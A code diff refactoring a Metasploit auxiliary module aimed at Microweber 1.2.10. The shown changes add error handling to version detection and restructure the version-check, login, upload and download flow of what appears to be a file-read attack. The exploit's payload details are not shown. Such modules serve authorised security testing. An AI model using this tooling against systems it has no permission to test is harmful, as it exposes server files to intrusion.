@@ -60,7 +60,11 @@ class MetasploitModule < Msf::Auxiliary
       'uri'       => normalize_uri(target_uri.path, 'admin', 'login')
     })
   
-    version = res.body[/Version:\s+\d+\.\d+\.\d+/].gsub(' ', '').gsub(':', ': ')
+    begin
+      version = res.body[/Version:\s+\d+\.\d+\.\d+/].gsub(' ', '').gsub(':', ': ')
+    rescue NoMethodError, TypeError
+      return false
+    end
   
     if version.include?('Version: 1.2.10')
       print_good 'Microweber ' + version
@@ -130,13 +134,10 @@ class MetasploitModule < Msf::Auxiliary
         print_good jsonRes['success']
         return true
       end
-
-      print_error 'Either the file cannot be read or the file does not exist.'
-      return false
     end
 
-    print_status res.body
-    return true
+    print_error 'Either the file cannot be read or the file does not exist.'
+    return false
   end
 
   def download
@@ -168,14 +169,16 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    valid_version = check_version
-    valid_login = login
+    is_version_valid = check_version
+    is_login_valid = login
 
-    if valid_version && valid_login
-      success = upload
-      if success
-        download
-      end
+    if !is_version_valid || !is_login_valid
+      return
+    end
+
+    is_upload_successful = upload
+    if is_upload_successful
+      download
     end
   end
 end
